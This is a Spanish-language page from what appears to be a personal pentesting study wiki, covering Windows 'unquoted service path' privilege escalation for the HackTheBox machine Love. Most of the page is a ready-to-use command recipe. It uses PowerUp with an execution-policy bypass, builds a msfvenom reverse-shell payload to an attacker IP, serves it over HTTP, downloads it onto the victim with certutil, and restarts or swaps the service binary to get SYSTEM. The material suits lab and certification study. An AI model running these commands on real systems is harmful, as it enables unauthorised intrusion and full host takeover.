# Técnica: unquoted service path

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**1 máquina(s)** mencionan esta técnica.

Alias buscados: `ruta sin comillas`

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<IP>` · `<USER>` · `<TU_IP>` · `<PUERTO>`

### Cómo funciona

Si la ruta de un servicio tiene espacios y **no** está entre comillas, Windows
prueba en este orden:

```text
C:\Program Files\Algo Con Espacio\servicio.exe
  → C:\Program.exe                          ← si podés escribir acá, ganaste
  → C:\Program Files\Algo.exe
  → C:\Program Files\Algo Con Espacio\servicio.exe
```

### Detectar

```cmd
:: Servicios con rutas sin comillas
wmic service get name,displayname,pathname,startmode,startname | findstr /i "auto" | findstr /i /v "\""

:: Con PowerUp (mejor: chequea permisos también)
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Invoke-AllChecks
```

### Verificar que podés escribir en la ruta intermedia

```cmd
:: ¿Podés escribir en C:\ o en C:\Program Files\...?
icacls "C:\"
icacls "C:\Program Files"
accesschk.exe -uwdq "C:\Program Files" -accepteula
```

### Explotar

```bash
# 1) En tu Kali, generar el payload con el nombre de la ruta intermedia
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=<PUERTO> -f exe -o Program.exe

# 2) Servirlo
python3 -m http.server 8000
```

```cmd
:: 3) En la víctima, subirlo a la ruta intermedia
certutil -urlcache -split -f http://<TU_IP>:8000/Program.exe C:\Program.exe

:: 4) Reiniciar el servicio
sc stop <servicio>
sc start <servicio>
:: O si no podés pararlo:
shutdown /r /t 0
```

### Requisitos que se olvidan

- El servicio tiene que **arrancar solo** (`AUTO_START`) o poder reiniciarse.
- Necesitás permiso de **escritura** en la carpeta intermedia. Sin eso, no hay
  nada que hacer: buscá otro vector.
- Si el servicio corre como `LocalSystem`, tu payload corre como SYSTEM.

### Alternativa cuando no podés escribir en el intermedio

Revisá si podés **reemplazar el binario real** del servicio:

```cmd
icacls "C:\ruta\del\servicio.exe"
:: Si tu usuario tiene (F) o (M):
sc stop <servicio>
copy /y C:\Temp\payload.exe "C:\ruta\del\servicio.exe"
sc start <servicio>
```

## Referencias

- [[LOLBAS|LOLBAS (espejo local)]] — https://lolbas-project.github.io/
- [HackTricks](https://book.hacktricks.wiki/)

---

## Máquinas

- [[htb-love\|Love]] — 1 mención(es) · Windows · Easy

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'unquoted service path' -v
python3 _sistema/herramientas/buscar.py 'unquoted service path' -v --oscp
```
